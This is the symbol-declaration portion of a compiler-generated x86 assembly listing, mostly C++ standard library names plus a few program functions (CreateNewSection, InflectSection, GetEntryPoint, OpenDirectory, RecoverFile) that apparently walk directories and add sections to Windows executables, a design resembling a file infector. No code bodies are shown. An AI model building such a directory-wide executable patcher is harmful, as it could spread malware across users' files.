PUBLIC	??$?9U_Dir_enum_impl@filesystem@std@@U012@@std@@YA_NABV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@0@0@Z ; std::operator!=<std::filesystem::_Dir_enum_impl,std::filesystem::_Dir_enum_impl>
PUBLIC	?begin@filesystem@std@@YA?AVdirectory_iterator@12@V312@@Z ; std::filesystem::begin
PUBLIC	?end@filesystem@std@@YA?AVdirectory_iterator@12@V312@@Z ; std::filesystem::end
PUBLIC	??$move@AAU_Creator@_Dir_enum_impl@filesystem@std@@@std@@YA$$QAU_Creator@_Dir_enum_impl@filesystem@0@AAU1230@@Z ; std::move<std::filesystem::_Dir_enum_impl::_Creator &>
PUBLIC	?align@@YAKKKK@Z				; align
PUBLIC	?CreateNewSection@@YA_NAAPAXAAPAU_IMAGE_NT_HEADERS@@PAEAAK3K@Z ; CreateNewSection
PUBLIC	?clear@?$basic_ios@DU?$char_traits@D@std@@@std@@QAEXH_N@Z ; std::basic_ios<char,std::char_traits<char> >::clear
PUBLIC	?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QAEXH_N@Z ; std::basic_ios<char,std::char_traits<char> >::setstate
PUBLIC	?tie@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEPAV?$basic_ostream@DU?$char_traits@D@std@@@2@XZ ; std::basic_ios<char,std::char_traits<char> >::tie
PUBLIC	?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEPAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ ; std::basic_ios<char,std::char_traits<char> >::rdbuf
PUBLIC	?fill@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEDXZ ; std::basic_ios<char,std::char_traits<char> >::fill
PUBLIC	?widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEDD@Z ; std::basic_ios<char,std::char_traits<char> >::widen
PUBLIC	?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ ; std::basic_ostream<char,std::char_traits<char> >::_Osfx
PUBLIC	??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<
PUBLIC	?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@D@Z ; std::basic_ostream<char,std::char_traits<char> >::put
PUBLIC	?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@XZ ; std::basic_ostream<char,std::char_traits<char> >::flush
PUBLIC	??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
PUBLIC	??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
PUBLIC	?InflectSection@@YA_NAAPAXPAU_IMAGE_NT_HEADERS@@PAEKK@Z ; InflectSection
PUBLIC	?GetEntryPoint@@YAIPAU_IMAGE_NT_HEADERS@@PAE@Z	; GetEntryPoint
PUBLIC	?RecoverFile@@YA_NPBD@Z				; RecoverFile
PUBLIC	?OpenFile@@YA_NPBD@Z				; OpenFile
PUBLIC	?OpenDirectory@@YA_NPBD@Z			; OpenDirectory
PUBLIC	??$?0PBD$0A@@path@filesystem@std@@QAE@ABQBDW4format@012@@Z ; std::filesystem::path::path<char const *,0>
PUBLIC	??$?0$$BY04D$0A@@path@filesystem@std@@QAE@AAY04$$CBDW4format@012@@Z ; std::filesystem::path::path<char [5],0>
PUBLIC	_main
PUBLIC	??$move@AAV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@@std@@YA$$QAV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@0@AAV10@@Z ; std::move<std::shared_ptr<std::filesystem::_Dir_enum_impl> &>
PUBLIC	??$_Move_construct_from@U_Dir_enum_impl@filesystem@std@@@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IAEX$$QAV01@@Z ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::_Move_construct_from<std::filesystem::_Dir_enum_impl>
PUBLIC	??$_Copy_construct_from@U_Dir_enum_impl@filesystem@std@@@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IAEXABV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@1@@Z ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::_Copy_construct_from<std::filesystem::_Dir_enum_impl>
PUBLIC	??$addressof@V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPAV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AAV10@@Z ; std::addressof<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > >
PUBLIC	??$max@I@std@@YAABIABI0@Z			; std::max<unsigned int>
PUBLIC	??$min@I@std@@YAABIABI0@Z			; std::min<unsigned int>
PUBLIC	??R<lambda_38fb7828f6004e9a4c6a38bfc6df7f44>@@QBE@QA_WQB_WI_W@Z ; <lambda_38fb7828f6004e9a4c6a38bfc6df7f44>::operator()
PUBLIC	??$_Reallocate_grow_by@V<lambda_38fb7828f6004e9a4c6a38bfc6df7f44>@@_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV01@IV<lambda_38fb7828f6004e9a4c6a38bfc6df7f44>@@_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_grow_by<<lambda_38fb7828f6004e9a4c6a38bfc6df7f44>,wchar_t>
PUBLIC	??$addressof@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPAV?$_String_val@U?$_Simple_types@_W@std@@@0@AAV10@@Z ; std::addressof<std::_String_val<std::_Simple_types<wchar_t> > >
PUBLIC	??R<lambda_03628ca18370b1f44a99b655e704819b>@@QBE@QA_WIQB_W@Z ; <lambda_03628ca18370b1f44a99b655e704819b>::operator()
PUBLIC	??$_Reallocate_for@V<lambda_03628ca18370b1f44a99b655e704819b>@@PB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV01@IV<lambda_03628ca18370b1f44a99b655e704819b>@@PB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<<lambda_03628ca18370b1f44a99b655e704819b>,wchar_t const *>
PUBLIC	??R<lambda_2fb699096920f2dc628cb0826b07831d>@@QBE@QA_WQB_WI1I@Z ; <lambda_2fb699096920f2dc628cb0826b07831d>::operator()
PUBLIC	??$_Reallocate_grow_by@V<lambda_2fb699096920f2dc628cb0826b07831d>@@PB_WI@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV01@IV<lambda_2fb699096920f2dc628cb0826b07831d>@@PB_WI@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_grow_by<<lambda_2fb699096920f2dc628cb0826b07831d>,wchar_t const *,unsigned int>
PUBLIC	??$addressof@$$CBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@ABV10@@Z ; std::addressof<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > const >
PUBLIC	??$_Pocca@V?$allocator@_W@std@@@std@@YAXAAV?$allocator@_W@0@ABV10@@Z ; std::_Pocca<std::allocator<wchar_t> >
PUBLIC	??$_Pocma@V?$allocator@_W@std@@@std@@YAXAAV?$allocator@_W@0@0@Z ; std::_Pocma<std::allocator<wchar_t> >
PUBLIC	??$move@AAV?$allocator@_W@std@@@std@@YA$$QAV?$allocator@_W@0@AAV10@@Z ; std::move<std::allocator<wchar_t> &>
PUBLIC	??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@$$QAV?$allocator@_W@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> >
PUBLIC	??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>
PUBLIC	??$_Construct@$00PB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXQB_WI@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t const *>
PUBLIC	??$_Construct@$01PB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXQB_WI@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>
PUBLIC	??R<lambda_67d87d4aa1269033985980465fd1d824>@@QBE@QADQBDI@Z ; <lambda_67d87d4aa1269033985980465fd1d824>::operator()
PUBLIC	??$_Reallocate_grow_by@V<lambda_67d87d4aa1269033985980465fd1d824>@@$$V@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_67d87d4aa1269033985980465fd1d824>@@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_67d87d4aa1269033985980465fd1d824> >
PUBLIC	??$addressof@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@YAPAV?$_String_val@U?$_Simple_types@D@std@@@0@AAV10@@Z ; std::addressof<std::_String_val<std::_Simple_types<char> > >
PUBLIC	??$_Convert_size@II@std@@YAII@Z			; std::_Convert_size<unsigned int,unsigned int>
PUBLIC	??$move@AAV?$allocator@D@std@@@std@@YA$$QAV?$allocator@D@0@AAV10@@Z ; std::move<std::allocator<char> &>
PUBLIC	??$?0V?$allocator@D@std@@$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@$$QAV?$allocator@D@1@@Z ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><std::allocator<char> >
PUBLIC	??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><>
PUBLIC	??$_Construct@$00PBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXQBDI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Construct<1,char const *>
PUBLIC	??$_Construct@$01PBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXQBDI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Construct<2,char const *>
PUBLIC	??$_Unfancy@_W@std@@YAPA_WPA_W@Z		; std::_Unfancy<wchar_t>
PUBLIC	??R<lambda_c3135ae829aeedc0a8af1bd1e887c66a>@@QBE@QA_WQB_WII_W@Z ; <lambda_c3135ae829aeedc0a8af1bd1e887c66a>::operator()
PUBLIC	??$_Reallocate_grow_by@V<lambda_c3135ae829aeedc0a8af1bd1e887c66a>@@I_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV01@IV<lambda_c3135ae829aeedc0a8af1bd1e887c66a>@@I_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_grow_by<<lambda_c3135ae829aeedc0a8af1bd1e887c66a>,unsigned int,wchar_t>
PUBLIC	??$_Construct_in_place@PA_WAAPA_W@std@@YAXAAPA_W0@Z ; std::_Construct_in_place<wchar_t *,wchar_t * &>
PUBLIC	??$_Unfancy@D@std@@YAPADPAD@Z			; std::_Unfancy<char>
PUBLIC	??R<lambda_15711c68e099a15a58f4d77303cb286d>@@QBE@QADQBDID@Z ; <lambda_15711c68e099a15a58f4d77303cb286d>::operator()
PUBLIC	??$_Reallocate_grow_by@V<lambda_15711c68e099a15a58f4d77303cb286d>@@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_15711c68e099a15a58f4d77303cb286d>@@D@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_15711c68e099a15a58f4d77303cb286d>,char>
PUBLIC	??R<lambda_ab246b20b9526e2ef7792587e4298a77>@@QBE@QADQBDI1I@Z ; <lambda_ab246b20b9526e2ef7792587e4298a77>::operator()
PUBLIC	??$_Reallocate_grow_by@V<lambda_ab246b20b9526e2ef7792587e4298a77>@@PBDI@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_ab246b20b9526e2ef7792587e4298a77>@@PBDI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_ab246b20b9526e2ef7792587e4298a77>,char const *,unsigned int>
PUBLIC	??$_Construct_in_place@PADAAPAD@std@@YAXAAPAD0@Z ; std::_Construct_in_place<char *,char * &>
PUBLIC	??$swap@PAV_Ref_count_base@std@@$0A@@std@@YAXAAPAV_Ref_count_base@0@0@Z ; std::swap<std::_Ref_count_base *,0>
PUBLIC	??$_Deallocate@$07$0A@@std@@YAXPAXI@Z		; std::_Deallocate<8,0>
PUBLIC	??$swap@PAU_Dir_enum_impl@filesystem@std@@$0A@@std@@YAXAAPAU_Dir_enum_impl@filesystem@0@0@Z ; std::swap<std::filesystem::_Dir_enum_impl *,0>
PUBLIC	??$_Construct_in_place@PA_WABQA_W@std@@YAXAAPA_WABQA_W@Z ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
PUBLIC	??$_Destroy_in_place@PA_W@std@@YAXAAPA_W@Z	; std::_Destroy_in_place<wchar_t *>
PUBLIC	??$_Destroy_in_place@PAD@std@@YAXAAPAD@Z	; std::_Destroy_in_place<char *>
PUBLIC	??R?$default_delete@V_Facet_base@std@@@std@@QBEXPAV_Facet_base@1@@Z ; std::default_delete<std::_Facet_base>::operator()
PUBLIC	??1?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QAE@XZ ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::~unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >
PUBLIC	?release@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QAEPAV_Facet_base@2@XZ ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::release
PUBLIC	?_Get_first@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PAV_Facet_base@2@$00@std@@QAEAAU?$default_delete@V_Facet_base@std@@@2@XZ ; std::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1>::_Get_first
PUBLIC	??$?0U?$default_delete@V_Facet_base@std@@@std@@$0A@@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QAE@PAV_Facet_base@1@@Z ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> ><std::default_delete<std::_Facet_base>,0>
PUBLIC	??$_Get_unwrapped@AAPB_W@std@@YA?A_TAAPB_W@Z	; std::_Get_unwrapped<wchar_t const * &>
PUBLIC	??$_Get_unwrapped@ABQB_W@std@@YA?A_TABQB_W@Z	; std::_Get_unwrapped<wchar_t const * const &>
PUBLIC	??$_Seek_wrapped@PB_WAAPB_W@std@@YAXAAPB_W0@Z	; std::_Seek_wrapped<wchar_t const *,wchar_t const * &>
PUBLIC	??$_Find_unchecked@PB_W_W@std@@YAPB_WPB_WQB_WAB_W@Z ; std::_Find_unchecked<wchar_t const *,wchar_t>
PUBLIC	??$_Seek_wrapped@PB_WPB_W@std@@YAXAAPB_W$$QAPB_W@Z ; std::_Seek_wrapped<wchar_t const *,wchar_t const *>
PUBLIC	??$_Convert_wide_to@U?$char_traits@D@std@@V?$allocator@D@2@D@filesystem@std@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@V?$basic_string_view@_WU?$char_traits@_W@std@@@1@ABV?$allocator@D@1@@Z ; std::filesystem::_Convert_wide_to<std::char_traits<char>,std::allocator<char>,char>
PUBLIC	??$_Convert_Source_to_wide@V?$basic_string_view@_WU?$char_traits@_W@std@@@std@@U_Normal_conversion@filesystem@2@@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@1@ABV?$basic_string_view@_WU?$char_traits@_W@std@@@1@U_Normal_conversion@01@@Z ; std::filesystem::_Convert_Source_to_wide<std::basic_string_view<wchar_t,std::char_traits<wchar_t> >,std::filesystem::_Normal_conversion>
PUBLIC	??$?0ABV?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@ABV?$allocator@_W@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> const &>
PUBLIC	??$append@V?$basic_string_view@DU?$char_traits@D@std@@@std@@$0A@@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV01@ABV?$basic_string_view@DU?$char_traits@D@std@@@1@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append<std::basic_string_view<char,std::char_traits<char> >,0>
PUBLIC	??$make_shared@U_Dir_enum_impl@filesystem@std@@U_Creator@123@ABW4directory_options@23@@std@@YA?AV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@0@$$QAU_Creator@_Dir_enum_impl@filesystem@0@ABW4directory_options@40@@Z ; std::make_shared<std::filesystem::_Dir_enum_impl,std::filesystem::_Dir_enum_impl::_Creator,enum std::filesystem::directory_options const &>
PUBLIC	??0_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@AAV12@@Z ; std::basic_ostream<char,std::char_traits<char> >::_Sentry_base::_Sentry_base
PUBLIC	??1_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ ; std::basic_ostream<char,std::char_traits<char> >::_Sentry_base::~_Sentry_base
PUBLIC	??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@AAV12@@Z ; std::basic_ostream<char,std::char_traits<char> >::sentry::sentry
PUBLIC	??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ ; std::basic_ostream<char,std::char_traits<char> >::sentry::~sentry
PUBLIC	??Bsentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QBE_NXZ ; std::basic_ostream<char,std::char_traits<char> >::sentry::operator bool
PUBLIC	?pubsync@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAEHXZ ; std::basic_streambuf<char,std::char_traits<char> >::pubsync
PUBLIC	?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAEHD@Z ; std::basic_streambuf<char,std::char_traits<char> >::sputc
PUBLIC	?sputn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAE_JPBD_J@Z ; std::basic_streambuf<char,std::char_traits<char> >::sputn
PUBLIC	?_Pninc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IAEPADXZ ; std::basic_streambuf<char,std::char_traits<char> >::_Pninc
PUBLIC	?_Pnavail@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IBE_JXZ ; std::basic_streambuf<char,std::char_traits<char> >::_Pnavail
PUBLIC	??$_Convert_Source_to_wide@PBDU_Normal_conversion@filesystem@std@@@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@1@ABQBDU_Normal_conversion@01@@Z ; std::filesystem::_Convert_Source_to_wide<char const *,std::filesystem::_Normal_conversion>
PUBLIC	??$_Convert_Source_to_wide@$$BY04DU_Normal_conversion@filesystem@std@@@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@1@AAY04$$CBDU_Normal_conversion@01@@Z ; std::filesystem::_Convert_Source_to_wide<char [5],std::filesystem::_Normal_conversion>
PUBLIC	??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPA_WAAV?$allocator@_W@1@AAI@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
PUBLIC	??$forward@V?$allocator@_W@std@@@std@@YA$$QAV?$allocator@_W@0@AAV10@@Z ; std::forward<std::allocator<wchar_t> >
PUBLIC	??$_Allocate_for_capacity@$0A@@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAPADAAV?$allocator@D@1@AAI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Allocate_for_capacity<0>
PUBLIC	??$_Construct_in_place@PADABQAD@std@@YAXAAPADABQAD@Z ; std::_Construct_in_place<char *,char * const &>
PUBLIC	??$forward@V?$allocator@D@std@@@std@@YA$$QAV?$allocator@D@0@AAV10@@Z ; std::forward<std::allocator<char> >
PUBLIC	??$addressof@PA_W@std@@YAPAPA_WAAPA_W@Z		; std::addressof<wchar_t *>
PUBLIC	??$forward@AAPA_W@std@@YAAAPA_WAAPA_W@Z		; std::forward<wchar_t * &>
PUBLIC	??$addressof@PAD@std@@YAPAPADAAPAD@Z		; std::addressof<char *>
PUBLIC	??$forward@AAPAD@std@@YAAAPADAAPAD@Z		; std::forward<char * &>
PUBLIC	??$move@AAPAV_Ref_count_base@std@@@std@@YA$$QAPAV_Ref_count_base@0@AAPAV10@@Z ; std::move<std::_Ref_count_base * &>
PUBLIC	??$move@AAPAU_Dir_enum_impl@filesystem@std@@@std@@YA$$QAPAU_Dir_enum_impl@filesystem@0@AAPAU120@@Z ; std::move<std::filesystem::_Dir_enum_impl * &>
PUBLIC	??$forward@ABQA_W@std@@YAABQA_WABQA_W@Z		; std::forward<wchar_t * const &>
PUBLIC	??$exchange@PAV_Facet_base@std@@$$T@std@@YAPAV_Facet_base@0@AAPAV10@$$QA$$T@Z ; std::exchange<std::_Facet_base *,std::nullptr_t>
PUBLIC	??$?0ABV?$allocator@D@std@@$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@ABV?$allocator@D@1@@Z ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><std::allocator<char> const &>
PUBLIC	??R<lambda_c1b8c41cb4019640539cfd828748c4d4>@@QBE@QADQBDIID@Z ; <lambda_c1b8c41cb4019640539cfd828748c4d4>::operator()
PUBLIC	??$_Reallocate_grow_by@V<lambda_c1b8c41cb4019640539cfd828748c4d4>@@ID@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_c1b8c41cb4019640539cfd828748c4d4>@@ID@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_c1b8c41cb4019640539cfd828748c4d4>,unsigned int,char>
PUBLIC	??$?0AAPAV_Facet_base@std@@@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PAV_Facet_base@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@AAPAV_Facet_base@1@@Z ; std::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1>::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1><std::_Facet_base * &>
PUBLIC	??$_Could_compare_equal_to_value_type@PB_W_W@std@@YA_NAB_W@Z ; std::_Could_compare_equal_to_value_type<wchar_t const *,wchar_t>
PUBLIC	??$_To_address@PB_W@std@@YA?A_PABQB_W@Z		; std::_To_address<wchar_t const *>
PUBLIC	??$__std_find_trivial@$$CB_W_W@@YAPB_WPB_W0_W@Z	; __std_find_trivial<wchar_t const ,wchar_t>
PUBLIC	??$forward@PB_W@std@@YA$$QAPB_WAAPB_W@Z		; std::forward<wchar_t const *>
PUBLIC	??$_Stringoid_from_Source@_WU?$char_traits@_W@std@@@filesystem@std@@YA?A_PABV?$basic_string_view@_WU?$char_traits@_W@std@@@1@@Z ; std::filesystem::_Stringoid_from_Source<wchar_t,std::char_traits<wchar_t> >
PUBLIC	??$_Convert_stringoid_to_wide@U_Normal_conversion@filesystem@std@@@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@1@V?$basic_string_view@_WU?$char_traits@_W@std@@@1@U_Normal_conversion@01@@Z ; std::filesystem::_Convert_stringoid_to_wide<std::filesystem::_Normal_conversion>
PUBLIC	??$forward@ABV?$allocator@_W@std@@@std@@YAABV?$allocator@_W@0@ABV10@@Z ; std::forward<std::allocator<wchar_t> const &>
PUBLIC	??1?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@UAE@XZ ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl>::~_Ref_count_obj2<std::filesystem::_Dir_enum_impl>
PUBLIC	?_Destroy@?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@EAEXXZ ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl>::_Destroy
PUBLIC	?_Delete_this@?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@EAEXXZ ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl>::_Delete_this
PUBLIC	??_G?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@UAEPAXI@Z ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl>::`scalar deleting destructor'
PUBLIC	??$forward@U_Creator@_Dir_enum_impl@filesystem@std@@@std@@YA$$QAU_Creator@_Dir_enum_impl@filesystem@0@AAU1230@@Z ; std::forward<std::filesystem::_Dir_enum_impl::_Creator>
PUBLIC	??$forward@ABW4directory_options@filesystem@std@@@std@@YAABW4directory_options@filesystem@0@ABW4120@@Z ; std::forward<enum std::filesystem::directory_options const &>
PUBLIC	??$?0U_Creator@_Dir_enum_impl@filesystem@std@@ABW4directory_options@23@@?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@QAE@$$QAU_Creator@_Dir_enum_impl@filesystem@1@ABW4directory_options@41@@Z ; std::_Ref_count_obj2<std::filesystem::_Dir_enum_impl>::_Ref_count_obj2<std::filesystem::_Dir_enum_impl><std::filesystem::_Dir_enum_impl::_Creator,enum std::filesystem::directory_options const &>
PUBLIC	??$addressof@U_Dir_enum_impl@filesystem@std@@@std@@YAPAU_Dir_enum_impl@filesystem@0@AAU120@@Z ; std::addressof<std::filesystem::_Dir_enum_impl>
PUBLIC	??$_Set_ptr_rep_and_enable_shared@U_Dir_enum_impl@filesystem@std@@@?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@AAEXQAU_Dir_enum_impl@filesystem@1@QAV_Ref_count_base@1@@Z ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::_Set_ptr_rep_and_enable_shared<std::filesystem::_Dir_enum_impl>
PUBLIC	??$_Stringoid_from_Source@PBD@filesystem@std@@YA?A_PABQBD@Z ; std::filesystem::_Stringoid_from_Source<char const *>
PUBLIC	??$_Get_unwrapped_unverified@ABQBD@std@@YA?A_TABQBD@Z ; std::_Get_unwrapped_unverified<char const * const &>
PUBLIC	??$_Convert_stringoid_to_wide@U_Normal_conversion@filesystem@std@@@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@1@V?$basic_string_view@DU?$char_traits@D@std@@@1@U_Normal_conversion@01@@Z ; std::filesystem::_Convert_stringoid_to_wide<std::filesystem::_Normal_conversion>
PUBLIC	??$_Stringoid_from_Source@$$BY04D@filesystem@std@@YA?A_PAAY04$$CBD@Z ; std::filesystem::_Stringoid_from_Source<char [5]>
PUBLIC	??$_Get_unwrapped_unverified@AAY04$$CBD@std@@YA?A_TAAY04$$CBD@Z ; std::_Get_unwrapped_unverified<char const (&)[5]>
PUBLIC	??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPA_WAAV?$allocator@_W@0@AAI@Z ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >
PUBLIC	??$_Allocate_at_least_helper@V?$allocator@D@std@@@std@@YAPADAAV?$allocator@D@0@AAI@Z ; std::_Allocate_at_least_helper<std::allocator<char> >
PUBLIC	??$forward@ABQAD@std@@YAABQADABQAD@Z		; std::forward<char * const &>
PUBLIC	??$forward@ABV?$allocator@D@std@@@std@@YAABV?$allocator@D@0@ABV10@@Z ; std::forward<std::allocator<char> const &>
